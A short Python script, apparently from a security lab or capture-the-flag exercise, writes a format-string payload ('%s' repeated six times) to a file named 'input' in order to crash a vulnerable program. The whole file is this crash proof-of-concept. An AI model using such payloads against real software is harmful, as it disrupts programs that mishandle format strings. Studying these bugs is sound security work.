#!/usr/bin/python3
# crash the program

payload = "%s%s%s%s%s%s".encode('latin-1')

with open('input', 'wb') as f:
  f.write(payload)